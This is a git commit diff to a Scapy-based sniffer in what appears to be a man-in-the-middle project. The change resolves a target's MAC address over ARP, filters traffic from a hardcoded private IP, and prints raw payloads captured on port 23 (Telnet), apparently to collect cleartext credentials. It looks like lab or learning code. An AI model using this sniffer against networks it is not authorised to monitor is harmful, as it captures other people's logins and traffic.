d4c056caef432fe1dd15a919dbaac7af9a2c8724
antoinepryy <antoine.ap.57@gmail.com>
2020-05-18 17:29:35 +0200

    sniffer good filter

--- mitm/sniffer.py
+++ mitm/sniffer.py
@@ -3,18 +3,28 @@ from scapy.all import *
 
 username = ""
 password = ""
-
+interface="eth0"
+def get_mac(IP):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
+    for snd, rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
 
 def print_pkt(pkt):
     try:
-        print(pkt.getlayer(Raw).load)
-    except:
-        pass
+        mac = get_mac("192.168.0.42")
+        if (pkt[Ether].src == mac and (pkt.getlayer(Raw) is not None)):
+            print(pkt.getlayer(Raw).load)
+            #pkt.show()
+        #if (pkt[IP].src == "192.168.0.42" and pkt[IP].dst == "192.168.0.43"):
+        #pkt.show()
+        #print(pkt.getlayer(Raw).load)
+    except Exception as e:
+        print(e)
     # pkt.show()
 
 
-target = raw_input("[*] Enter target IP: ")
-port = raw_input("[*] Enter port: ")
-packet_filter = "IP src {} port {}".format(target, port)
-print(packet_filter)
-pkt = sniff(filter=packet_filter, prn=print_pkt)
+#target = input("[*] Enter target IP: ")
+#port = input("[*] Enter port: ")
+#packet_filter = " IP src {} port {} ".format(target, port)
+pkt = sniff(filter='port 23', prn=print_pkt)
